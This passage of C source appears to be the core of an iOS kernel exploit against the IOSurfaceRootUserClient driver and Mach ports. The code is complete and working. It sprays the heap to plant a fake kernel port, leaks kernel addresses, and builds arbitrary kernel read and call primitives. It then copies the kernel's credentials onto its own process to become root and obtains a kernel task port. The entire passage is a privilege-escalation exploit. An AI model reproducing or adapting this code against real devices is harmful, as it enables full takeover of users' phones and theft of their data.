    dict[DATA_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    // ipc.ports zone uses 0x3000 allocation chunks, but hardware page size before A9
    // is actually 0x1000, so references to our reallocated memory may be shifted
    // by (0x1000 % sizeof(kport_t))
    kport_t triple_kport =
    {
        .ip_lock =
        {
            .data = 0x0,
            .type = 0x11,
        },
#ifdef __LP64__
        .ip_messages =
        {
            .port =
            {
                .waitq =
                {
                    .waitq_queue =
                    {
                        .next = 0x0,
                        .prev = 0x11,
                    }
                },
            },
        },
        .ip_nsrequest = 0x0,
        .ip_pdrequest = 0x11,
#endif
    };
    for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        UNALIGNED_COPY(&triple_kport, ptr, sizeof(kport_t));
    }
#endif

    // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
    // which sucks. To work around it, I register the port to be freed on my own task (thus increasing refs),
    // sleep after the connect call and register again, thus releasing the reference synchronously.
    ret = mach_ports_register(self, &port, 1);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    uint64_t ref = 0;
    uint64_t in[3] = { 0, 0x666, 0 };
    IOConnectCallAsyncStructMethod(client, 17, realport, &ref, 1, in, sizeof(in), NULL, NULL);
    IOConnectCallAsyncStructMethod(client, 17, port, &ref, 1, in, sizeof(in), NULL, NULL);

    LOG("herp derp");
    usleep(100000);

    sched_yield();
    ret = mach_ports_register(self, &client, 1); // gonna use that later
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_ports_register: %s", mach_error_string(ret));
        goto out;
    }

    // Prevent cleanup
    fakeport = port;
    port = MACH_PORT_NULL;

    // Release port with ool port refs
    RELEASE_PORT(stuffport);

    ret = my_mach_zone_force_gc(host);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
        goto out;
    }

#if 0
    for(uint32_t i = 0; i < NUM_DATA; ++i)
    {
        dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        kport_t *dptr = (kport_t*)&dict[5];
        for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
        {
            *(((volatile uint32_t*)&dptr[j].ip_context) + 1) = 0x10000000 | (j << 20) | i;
#ifdef __LP64__
            *(volatile uint32_t*)&dptr[j].ip_messages.port.pad = 0x20000000 | (j << 20) | i;
            *(volatile uint32_t*)&dptr[j].ip_lock.pad = 0x30000000 | (j << 20) | i;
#endif
        }
        uint32_t dummy = 0;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        if(ret != KERN_SUCCESS)
        {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
            goto out;
        }
    }
#endif
    dummy = 0;
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict_big, dictsz_big, &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("setValue(big): %s", mach_error_string(ret));
        goto out;
    }

    uint64_t ctx = 0xffffffff;
    ret = my_mach_port_get_context(self, fakeport, &ctx);
    LOG("mach_port_get_context: 0x%016llx, %s", ctx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    uint32_t shift_mask = ctx >> 60;
    if(shift_mask < 1 || shift_mask > 3)
    {
        LOG("Invalid shift mask.");
        goto out;
    }
#if 0
    uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));
#endif
    uint32_t ins = ((shift_mask - 1) * pagesize) % sizeof(kport_t),
             idx = (ctx >> 32) & 0xfffff,
             iff = (ctx >> 52) & 0xff;
    int64_t fp_off = sizeof(kport_t) * iff - ins;
    if(fp_off < 0)
    {
        --idx;
        fp_off += pagesize;
    }
    uint64_t fakeport_off = (uint64_t)fp_off;
    LOG("fakeport offset: 0x%llx", fakeport_off);
#if 0
    dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(idx);
#endif
    uint32_t request[] =
    {
        // Same header
        surface.data.id,
        0x0,

#if 0
        transpose(idx), // Key
#endif
        0x0, // Placeholder
        0x0, // Null terminator
    };
    kport_t kport;
    VOLATILE_BZERO32(&kport, sizeof(kport));
    kport.ip_bits = 0x80000000; // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
    kport.ip_references = 100;
    kport.ip_lock.type = 0x11;
    kport.ip_messages.port.receiver_name = 1;
    kport.ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
    kport.ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    kport.ip_srights = 99;

#if 0
    // Note to self: must be `(uintptr_t)&dict[5] + DATA_SIZE` and not `ptr + DATA_SIZE`.
    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        UNALIGNED_COPY(&kport, ptr, sizeof(kport_t));
    }
#endif

    ret = reallocate_fakeport(client, surface.data.id, idx, fakeport_off, pagesize, &kport, dict_small, dictsz_small);
    LOG("reallocate_fakeport: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    // Register realport on fakeport
    mach_port_t notify = MACH_PORT_NULL;
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification(realport): %x, %s", notify, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

#if 0
    uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
    size = sizeof(response);
    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    if(size < DATA_SIZE + 0x10)
    {
        LOG("Response too short.");
        goto out;
    }
#endif
    kport_t myport;
    VOLATILE_BZERO32(&myport, sizeof(myport));
    ret = readback_fakeport(client, idx, fakeport_off, pagesize, request, sizeof(request), resp, respsz, &myport);
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

#if 0
    uint32_t fakeport_off = -1;
    kptr_t realport_addr = 0;
    for(uintptr_t ptr = (uintptr_t)&response[4] + shift_off, end = (uintptr_t)&response[4] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        kptr_t val = UNALIGNED_KPTR_DEREF(&((kport_t*)ptr)->ip_pdrequest);
        if(val)
        {
            fakeport_off = ptr - (uintptr_t)&response[4];
            realport_addr = val;
            break;
        }
    }
#endif
    kptr_t realport_addr = myport.ip_pdrequest;
    if(!realport_addr)
    {
        LOG("Failed to leak realport address");
        goto out;
    }
    LOG("realport addr: " ADDR, realport_addr);
#if 0
    uintptr_t fakeport_dictbuf = (uintptr_t)&dict[5] + fakeport_off;
#endif

    // Register fakeport on itself (and clean ref on realport)
    notify = MACH_PORT_NULL;
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, fakeport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification(fakeport): %x, %s", notify, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

#if 0
    size = sizeof(response);
    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    if(size < DATA_SIZE + 0x10)
    {
        LOG("Response too short.");
        goto out;
    }
    kptr_t fakeport_addr = UNALIGNED_KPTR_DEREF(&((kport_t*)((uintptr_t)&response[4] + fakeport_off))->ip_pdrequest);
#endif
    ret = readback_fakeport(client, idx, fakeport_off, pagesize, request, sizeof(request), resp, respsz, &myport);
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    kptr_t fakeport_addr = myport.ip_pdrequest;
    if(!fakeport_addr)
    {
        LOG("Failed to leak fakeport address");
        goto out;
    }
    LOG("fakeport addr: " ADDR, fakeport_addr);
    kptr_t fake_addr = fakeport_addr - fakeport_off;

    kport_request_t kreq =
    {
        .notify =
        {
            .port = 0,
        }
    };
    kport.ip_requests = fakeport_addr + ((uintptr_t)&kport.ip_context - (uintptr_t)&kport) - ((uintptr_t)&kreq.name.size - (uintptr_t)&kreq);
#if 0
    UNALIGNED_COPY(&kport, fakeport_dictbuf, sizeof(kport));

    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
#endif
    ret = reallocate_fakeport(client, surface.data.id, idx, fakeport_off, pagesize, &kport, dict_small, dictsz_small);
    LOG("reallocate_fakeport: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

#define KREAD(addr, buf, len) \
do \
{ \
    for(size_t i = 0; i < ((len) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
    { \
        ret = my_mach_port_set_context(self, fakeport, (addr) + i * sizeof(uint32_t)); \
        if(ret != KERN_SUCCESS) \
        { \
            LOG("mach_port_set_context: %s", mach_error_string(ret)); \
            goto out; \
        } \
        mach_msg_type_number_t outsz = 1; \
        ret = mach_port_get_attributes(self, fakeport, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)((uint32_t*)(buf) + i), &outsz); \
        if(ret != KERN_SUCCESS) \
        { \
            LOG("mach_port_get_attributes: %s", mach_error_string(ret)); \
            goto out; \
        } \
    } \
} while(0)

    kptr_t itk_space = 0;
    KREAD(realport_addr + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &itk_space, sizeof(itk_space));
    LOG("itk_space: " ADDR, itk_space);
    if(!itk_space)
    {
        goto out;
    }

    kptr_t self_task = 0;
    KREAD(itk_space + off->ipc_space_is_task, &self_task, sizeof(self_task));
    LOG("self_task: " ADDR, self_task);
    if(!self_task)
    {
        goto out;
    }

    kptr_t IOSurfaceRootUserClient_port = 0;
    KREAD(self_task + off->task_itk_registered, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
    LOG("IOSurfaceRootUserClient port: " ADDR, IOSurfaceRootUserClient_port);
    if(!IOSurfaceRootUserClient_port)
    {
        goto out;
    }

    kptr_t IOSurfaceRootUserClient_addr = 0;
    KREAD(IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_kobject - (uintptr_t)&kport), &IOSurfaceRootUserClient_addr, sizeof(IOSurfaceRootUserClient_addr));
    LOG("IOSurfaceRootUserClient addr: " ADDR, IOSurfaceRootUserClient_addr);
    if(!IOSurfaceRootUserClient_addr)
    {
        goto out;
    }

    kptr_t IOSurfaceRootUserClient_vtab = 0;
    KREAD(IOSurfaceRootUserClient_addr, &IOSurfaceRootUserClient_vtab, sizeof(IOSurfaceRootUserClient_vtab));
    LOG("IOSurfaceRootUserClient vtab: " ADDR, IOSurfaceRootUserClient_vtab);
    if(!IOSurfaceRootUserClient_vtab)
    {
        goto out;
    }

    // Unregister IOSurfaceRootUserClient port
    ret = mach_ports_register(self, NULL, 0);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    kptr_t vtab[VTAB_SIZE] = { 0 };
    KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));

    kptr_t kbase = (vtab[off->vtab_get_retain_count] & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
    for(uint32_t magic = 0; 1; kbase -= KERNEL_SLIDE_STEP)
    {
        KREAD(kbase, &magic, sizeof(magic));
        if(magic == KERNEL_MAGIC)
        {
            break;
        }
    }
    LOG("Kernel base: " ADDR, kbase);

#define OFF(name) (off->name + (kbase - off->base))

    kptr_t zone_map_addr = 0;
    KREAD(OFF(zone_map), &zone_map_addr, sizeof(zone_map_addr));
    LOG("zone_map: " ADDR, zone_map_addr);
    if(!zone_map_addr)
    {
        goto out;
    }

#ifdef __LP64__
    vtab[off->vtab_get_external_trap_for_index] = OFF(rop_ldr_x0_x0_0x10);
#else
    vtab[off->vtab_get_external_trap_for_index] = OFF(rop_ldr_r0_r0_0xc);
#endif

    uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? UINT64_ALIGN_UP(fakeport_off + sizeof(kport_t)) : UINT64_ALIGN_DOWN(fakeport_off - sizeof(ktask_t));
    void* faketask_buf = (void*)((uintptr_t)&dict_small[9] + faketask_off);

    ktask_t ktask;
    VOLATILE_BZERO32(&ktask, sizeof(ktask));
    ktask.a.lock.data = 0x0;
    ktask.a.lock.type = 0x22;
    ktask.a.ref_count = 100;
    ktask.a.active = 1;
    ktask.a.map = zone_map_addr;
    ktask.b.itk_self = 1;
#if 0
    UNALIGNED_COPY(&ktask, faketask_buf, sizeof(ktask));
#endif
    VOLATILE_BCOPY32(&ktask, faketask_buf, sizeof(ktask));

    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport.ip_kobject = fake_addr + faketask_off;
    kport.ip_requests = 0;
    kport.ip_context = 0;
#if 0
    UNALIGNED_COPY(&kport, fakeport_dictbuf, sizeof(kport));
#endif
    if(fakeport_off + sizeof(kport_t) > pagesize)
    {
        size_t sz = pagesize - fakeport_off;
        VOLATILE_BCOPY32(&kport, (void*)((uintptr_t)&dict_small[9] + fakeport_off), sz);
        VOLATILE_BCOPY32((void*)((uintptr_t)&kport + sz), &dict_small[9], sizeof(kport) - sz);
    }
    else
    {
        VOLATILE_BCOPY32(&kport, (void*)((uintptr_t)&dict_small[9] + fakeport_off), sizeof(kport));
    }

#undef KREAD
#if 0
    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
#endif
    shmemsz = pagesize;
    dict_small[6] = transpose(idx);
    ret = reallocate_buf(client, surface.data.id, idx, dict_small, dictsz_small);
    LOG("reallocate_buf: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    if(fakeport_off + sizeof(kport_t) > pagesize)
    {
        shmemsz *= 2;
        dict_small[6] = transpose(idx + 1);
        ret = reallocate_buf(client, surface.data.id, idx + 1, dict_small, dictsz_small);
        LOG("reallocate_buf: %s", mach_error_string(ret));
        if(ret != KERN_SUCCESS)
        {
            goto out;
        }
    }

    vm_prot_t cur = 0,
              max = 0;
    sched_yield();
    ret = mach_vm_remap(self, &shmem_addr, shmemsz, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, fakeport, fake_addr, false, &cur, &max, VM_INHERIT_NONE);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_vm_remap: %s", mach_error_string(ret));
        goto out;
    }
    *(uint32_t*)shmem_addr = 123; // fault page
    LOG("shmem_addr: 0x%016llx", shmem_addr);
    volatile kport_t *fakeport_buf = (volatile kport_t*)(shmem_addr + fakeport_off);

    uint32_t vtab_off = fakeport_off < sizeof(vtab) ? fakeport_off + sizeof(kport_t) : 0;
    vtab_off = UINT64_ALIGN_UP(vtab_off);
    kptr_t vtab_addr = fake_addr + vtab_off;
    LOG("vtab addr: " ADDR, vtab_addr);
    volatile kptr_t *vtab_buf = (volatile kptr_t*)(shmem_addr + vtab_off);
    for(volatile kptr_t *src = vtab, *dst = vtab_buf, *end = src + VTAB_SIZE; src < end; *(dst++) = *(src++));

#define MAXRANGES 5
    struct
    {
        uint32_t start;
        uint32_t end;
    } ranges[MAXRANGES] =
    {
        { fakeport_off, (uint32_t)(fakeport_off + sizeof(kport_t)) },
        { vtab_off, (uint32_t)(vtab_off + sizeof(vtab)) },
    };
    size_t numranges = 2;
#define FIND_RANGE(var, size) \
do \
{ \
    if(numranges >= MAXRANGES) \
    { \
        LOG("FIND_RANGE(" #var "): ranges array too small"); \
        goto out; \
    } \
    for(uint32_t i = 0; i < numranges;) \
    { \
        uint32_t end = var + (uint32_t)(size); \
        if( \
            (var >= ranges[i].start && var < ranges[i].end) || \
            (end >= ranges[i].start && var < ranges[i].end) \
        ) \
        { \
            var = UINT64_ALIGN_UP(ranges[i].end); \
            i = 0; \
            continue; \
        } \
        ++i; \
    } \
    if(var + (uint32_t)(size) > pagesize) \
    { \
        LOG("FIND_RANGE(" #var ") out of range: 0x%x-0x%x", var, var + (uint32_t)(size)); \
        goto out; \
    } \
    ranges[numranges].start = var; \
    ranges[numranges].end = var + (uint32_t)(size); \
    ++numranges; \
} while(0)

    typedef volatile union
    {
        struct {
            // IOUserClient fields
            kptr_t vtab;
            uint32_t refs;
            uint32_t pad;
            // Gadget stuff
            kptr_t trap_ptr;
            // IOExternalTrap fields
            kptr_t obj;
            kptr_t func;
            uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
            // OSSerializer::serialize
            kptr_t indirect[3];
        } a;
        struct {
            char pad[OFFSET_IOUSERCLIENT_IPC];
            int32_t __ipc;
        } b;
    } kobj_t;

    uint32_t fakeobj_off = 0;
    FIND_RANGE(fakeobj_off, sizeof(kobj_t));
    kptr_t fakeobj_addr = fake_addr + fakeobj_off;
    LOG("fakeobj addr: " ADDR, fakeobj_addr);
    volatile kobj_t *fakeobj_buf = (volatile kobj_t*)(shmem_addr + fakeobj_off);
    VOLATILE_BZERO32(fakeobj_buf, sizeof(kobj_t));

    fakeobj_buf->a.vtab = vtab_addr;
    fakeobj_buf->a.refs = 100;
    fakeobj_buf->a.trap_ptr = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.obj - (uintptr_t)fakeobj_buf);
    fakeobj_buf->a.break_stuff = 0;
    fakeobj_buf->b.__ipc = 100;

    fakeport_buf->ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    fakeport_buf->ip_kobject = fakeobj_addr;

// First arg to KCALL can't be == 0, so we need KCALL_ZERO which indirects through OSSerializer::serialize.
// That way it can take way less arguments, but well, it can pass zero as first arg.
#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
( \
    fakeobj_buf->a.obj = (kptr_t)(x0), \
    fakeobj_buf->a.func = (kptr_t)(addr), \
    (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)) \
)
#define KCALL_ZERO(addr, x0, x1, x2) \
( \
    fakeobj_buf->a.obj = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.indirect - (uintptr_t)fakeobj_buf) - 2 * sizeof(kptr_t), \
    fakeobj_buf->a.func = OFF(osserializer_serialize), \
    fakeobj_buf->a.indirect[0] = (x0), \
    fakeobj_buf->a.indirect[1] = (x1), \
    fakeobj_buf->a.indirect[2] = (addr), \
    (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x2), 0, 0, 0, 0, 0) \
)
    kptr_t kernel_task_addr = 0;
    int r = KCALL(OFF(copyout), OFF(kernel_task), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
    LOG("kernel_task addr: " ADDR ", %s, %s", kernel_task_addr, errstr(r), mach_error_string(r));
    if(r != 0 || !kernel_task_addr)
    {
        goto out;
    }

    kptr_t kernproc_addr = 0;
    r = KCALL(OFF(copyout), kernel_task_addr + off->task_bsd_info, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
    LOG("kernproc addr: " ADDR ", %s, %s", kernproc_addr, errstr(r), mach_error_string(r));
    if(r != 0 || !kernproc_addr)
    {
        goto out;
    }

    kptr_t kern_ucred = 0;
    r = KCALL(OFF(copyout), kernproc_addr + off->proc_ucred, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("kern_ucred: " ADDR ", %s, %s", kern_ucred, errstr(r), mach_error_string(r));
    if(r != 0 || !kern_ucred)
    {
        goto out;
    }

    kptr_t self_proc = 0;
    r = KCALL(OFF(copyout), self_task + off->task_bsd_info, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
    LOG("self_proc: " ADDR ", %s, %s", self_proc, errstr(r), mach_error_string(r));
    if(r != 0 || !self_proc)
    {
        goto out;
    }

    kptr_t self_ucred = 0;
    r = KCALL(OFF(copyout), self_proc + off->proc_ucred, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    LOG("self_ucred: " ADDR ", %s, %s", self_ucred, errstr(r), mach_error_string(r));
    if(r != 0 || !self_ucred)
    {
        goto out;
    }

    int olduid = getuid();
    LOG("uid: %u", olduid);

    KCALL(OFF(kauth_cred_ref), kern_ucred, 0, 0, 0, 0, 0, 0);
    r = KCALL(OFF(copyin), &kern_ucred, self_proc + off->proc_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0 || !self_ucred)
    {
        goto out;
    }
    // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
    LOG("stole the kernel's credentials");
    setuid(0); // update host port

    int newuid = getuid();
    LOG("uid: %u", newuid);

    if(newuid != olduid)
    {
        KCALL_ZERO(OFF(chgproccnt), newuid, 1, 0);
        KCALL_ZERO(OFF(chgproccnt), olduid, -1, 0);
    }

    host_t realhost = mach_host_self();
    LOG("realhost: %x (host: %x)", realhost, host);

    uint32_t zm_task_off = 0;
    FIND_RANGE(zm_task_off, sizeof(ktask_t));
    kptr_t zm_task_addr = fake_addr + zm_task_off;
    LOG("zm_task addr: " ADDR, zm_task_addr);
    volatile ktask_t *zm_task_buf = (volatile ktask_t*)(shmem_addr + zm_task_off);
    VOLATILE_BZERO32(zm_task_buf, sizeof(ktask_t));

    zm_task_buf->a.lock.data = 0x0;
    zm_task_buf->a.lock.type = 0x22;
    zm_task_buf->a.ref_count = 100;
    zm_task_buf->a.active = 1;
    zm_task_buf->b.itk_self = 1;
    zm_task_buf->a.map = zone_map_addr;

    uint32_t km_task_off = 0;
    FIND_RANGE(km_task_off, sizeof(ktask_t));
    kptr_t km_task_addr = fake_addr + km_task_off;
    LOG("km_task addr: " ADDR, km_task_addr);
    volatile ktask_t *km_task_buf = (volatile ktask_t*)(shmem_addr + km_task_off);
    VOLATILE_BZERO32(km_task_buf, sizeof(ktask_t));

    km_task_buf->a.lock.data = 0x0;
    km_task_buf->a.lock.type = 0x22;
    km_task_buf->a.ref_count = 100;
    km_task_buf->a.active = 1;
    km_task_buf->b.itk_self = 1;
    r = KCALL(OFF(copyout), OFF(kernel_map), &km_task_buf->a.map, sizeof(km_task_buf->a.map), 0, 0, 0, 0);
    LOG("kernel_map: " ADDR ", %s", km_task_buf->a.map, errstr(r));
    if(r != 0 || !km_task_buf->a.map)
    {
        goto out;
    }

    kptr_t ipc_space_kernel = 0;
    r = KCALL(OFF(copyout), IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
    LOG("ipc_space_kernel: " ADDR ", %s", ipc_space_kernel, errstr(r));
    if(r != 0 || !ipc_space_kernel)
    {
        goto out;
    }

#ifdef __LP64__
    kmap_hdr_t zm_hdr = { 0 };
    r = KCALL(OFF(copyout), zm_task_buf->a.map + off->vm_map_hdr, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
    LOG("zm_range: " ADDR "-" ADDR ", %s", zm_hdr.start, zm_hdr.end, errstr(r));
    if(r != 0 || !zm_hdr.start || !zm_hdr.end)
    {
        goto out;
    }
    if(zm_hdr.end - zm_hdr.start > 0x100000000)
    {
        LOG("zone_map is too big, sorry.");
        goto out;
    }
    kptr_t zm_tmp = 0; // macro scratch space
#   define ZM_FIX_ADDR(addr) \
    ( \
        zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
        zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
    )
#else
#   define ZM_FIX_ADDR(addr) (addr)
#endif

    kptr_t ptrs[2] = { 0 };
    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("zm_port addr: " ADDR, ptrs[0]);
    LOG("km_port addr: " ADDR, ptrs[1]);

    KCALL(OFF(ipc_kobject_set), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(ipc_kobject_set), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);

    r = KCALL(OFF(copyin), ptrs, self_task + off->task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out;
    }
    mach_msg_type_number_t mapsNum = 0;
    ret = mach_ports_lookup(self, &maps, &mapsNum);
    LOG("mach_ports_lookup: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);
    if(!MACH_PORT_VALID(maps[0]) || !MACH_PORT_VALID(maps[1]))
    {
        goto out;
    }
    // Clean out the pointers without dropping refs
    ptrs[0] = ptrs[1] = 0;
    r = KCALL(OFF(copyin), ptrs, self_task + off->task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out;
    }

    mach_vm_address_t remap_addr = 0;
    ret = mach_vm_remap(maps[1], &remap_addr, off->sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    LOG("mach_vm_remap: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    LOG("remap_addr: 0x%016llx", remap_addr);

    ret = mach_vm_wire(realhost, maps[1], remap_addr, off->sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    LOG("mach_vm_wire: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("newport: " ADDR, newport);
    KCALL(OFF(ipc_kobject_set), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(ipc_port_make_send), newport, 0, 0, 0, 0, 0, 0);
    r = KCALL(OFF(copyin), &newport, OFF(realhost) + off->realhost_special + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out;
    }

    task_t kernel_task = MACH_PORT_NULL;
    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    LOG("kernel_task: %x, %s", kernel_task, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(kernel_task))
    {
        goto out;
    }

    if(callback)
    {
        ret = callback(kernel_task, kbase, cb_data);
        if(ret != KERN_SUCCESS)
        {
            LOG("callback returned error: %s", mach_error_string(ret));
            goto out;
        }
    }

    retval = KERN_SUCCESS;

out:;
    LOG("Cleaning up...");
    usleep(100000); // Allow logs to propagate
    if(maps)
    {
        RELEASE_PORT(maps[0]);
        RELEASE_PORT(maps[1]);
    }
    RELEASE_PORT(fakeport);
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        RELEASE_PORT(after[i]);
    }
    RELEASE_PORT(port);
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        RELEASE_PORT(before[i]);
    }
    RELEASE_PORT(realport);
    RELEASE_PORT(stuffport);
    RELEASE_PORT(client);
    my_mach_zone_force_gc(host);
    if(shmem_addr != 0)
    {
        _kernelrpc_mach_vm_deallocate_trap(self, shmem_addr, shmemsz);
        shmem_addr = 0;
    }
    if(dict_prep)
    {
        free(dict_prep);
    }
    if(dict_big)
    {
        free(dict_big);
    }
    if(dict_small)
    {
        free(dict_small);
    }
    if(resp)
    {
        free(resp);
    }

    // Pass through error code, if existent
    if(retval != KERN_SUCCESS && ret != KERN_SUCCESS)
    {
        retval = ret;
    }
    return retval;
}
